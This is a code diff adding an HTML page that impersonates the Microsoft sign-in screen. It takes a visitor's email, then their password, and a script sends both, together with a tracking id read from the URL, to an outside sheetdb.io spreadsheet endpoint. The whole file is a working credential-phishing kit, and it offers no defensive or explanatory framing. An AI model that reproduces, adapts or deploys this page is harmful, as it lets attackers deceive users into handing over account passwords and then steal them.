@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Microsoft Login</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: "Segoe UI", Arial, sans-serif;
+        background: #f3f3f3;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .container {
+        background: #fff;
+        width: 360px;
+        padding: 40px 35px;
+        border-radius: 8px;
+        box-shadow: 0 6px 25px rgba(0,0,0,0.15);
+    }
+
+    .logo img {
+        width: 90px;
+        margin-bottom: 25px;
+    }
+
+    h2 {
+        margin: 0 0 15px;
+        color: #000;
+        font-size: 22px;
+        font-weight: 600;
+    }
+
+    p {
+        margin-top: -5px;
+        font-size: 15px;
+        margin-bottom: 20px;
+        color: #555;
+    }
+
+    input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 18px;
+        border-radius: 4px;
+        border: 1px solid #bfbfbf;
+        font-size: 15px;
+        outline: none;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 12px;
+        background: #0067c0;
+        border: none;
+        border-radius: 4px;
+        color: white;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 5px;
+    }
+
+    .btn:hover {
+        background: #00529a;
+    }
+
+    a {
+        color: #0067c0;
+        text-decoration: none;
+        font-weight: 600;
+        font-size: 14px;
+    }
+
+    .links {
+        margin-top: 20px;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <!-- Microsoft logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
+    </div>
+<div id="username2password">
+    <h2>Sign in</h2>
+    <p>Use your Microsoft account</p>
+
+    <input id="user" type="text" placeholder="Email, phone, or Skype">
+
+    <button class="btn" onclick="topas()">Next</button>
+
+    <div class="links">
+        <a href="#">Create account</a><br><br>
+        <a href="#">Forgot username?</a>
+
+    </div>
+    </div>
+    
+                <p style="color: ghostwhite ;" id="wait_4_u">hdh</p>
+</div>
+
+
+
+
+<script>
+    function topas() {
+        if(document.getElementById('user').value !== "") {
+            
+            email = document.getElementById('user').value;
+            document.getElementById('wait_4_u').textContent = email;
+            
+            
+       document.getElementById('username2password').innerHTML = `
+    
+    <p>Use your Microsoft account</p>
+
+    <input id="password" type="text" placeholder="password">
+
+    <button class="btn" onclick="send()">login</button>
+
+    <div class="links">
+        <a href="#">Create account</a><br><br>
+        <a href="#">Forgot username?</a>
+    </div>`;}
+    else {
+        
+    }
+    }
+</script>
+
+
+
+        <script>
+        function send() {
+           const email = document.getElementById('wait_4_u').textContent;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "microsoft";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+        }
+            
+        </script>
+        
+        
+</body>
+</html>
